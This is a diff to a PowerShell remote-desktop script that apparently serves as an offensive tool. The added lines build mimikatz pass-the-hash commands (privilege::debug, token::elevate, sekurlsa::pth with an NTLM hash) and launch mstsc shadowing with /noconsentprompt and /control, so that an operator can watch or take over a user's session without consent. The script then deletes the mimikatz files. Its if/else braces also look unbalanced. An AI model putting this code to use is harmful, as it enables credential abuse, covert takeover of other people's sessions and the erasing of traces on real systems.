@@ -11,6 +11,7 @@ $Host.PrivateData.ProgressForegroundColor = 'White'
 $Host.PrivateData.ProgressBackgroundColor = 'Blue'
 Clear-Host
 
+
 function Show-Menu {
      Write-Host ""
      Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue ; Write-Host "         v2.8  " -ForegroundColor Yellow
@@ -244,13 +245,16 @@ function EnableTLS {
     sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2> $null }
     Write-Host ""
     $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
-    Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2500
-    $mimipwn = "mstsc /v $computer $admin /shadow:$shadow /noconsentprompt $prompt /f"
-    if(Test-Path variable:PassTheHash) { $admin = "/restrictedadmin" ; $prompt = $null } else { $admin = "/admin" ; $prompt = "/prompt" }
+    Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2500 
+    if(Test-Path variable:mimikatz) { $admin = "/restrictedadmin" } else { $admin = "/admin" ; $domain = "$null" ; $ntlmpass = "$null" }
+    if($control -eq 'true') { $mimipwn = "mstsc /v '$computer $admin /shadow:$shadow /control /noconsentprompt' /f"
     $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $mimipwn' exit"
     if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
-    if($control -eq 'true') { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt $prompt /f }
-    else { mstsc /v $computer /$admin /shadow:$shadow /noconsentprompt $prompt /f }}
+    else { mstsc /v $computer $admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
+    else { $mimipwn = "mstsc /v '$computer $admin /shadow:$shadow /noconsentprompt' /f"
+    $passthemimi = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell` $mimipwn' exit"
+    if(Test-Path variable:mimikatz) { powershell $mimipath\mimikatz.exe $passthemimi ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" }
+    else { mstsc /v $computer $admin /shadow:$shadow /noconsentprompt /prompt /f }}}
 
 Write-Host ""
 Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 2500
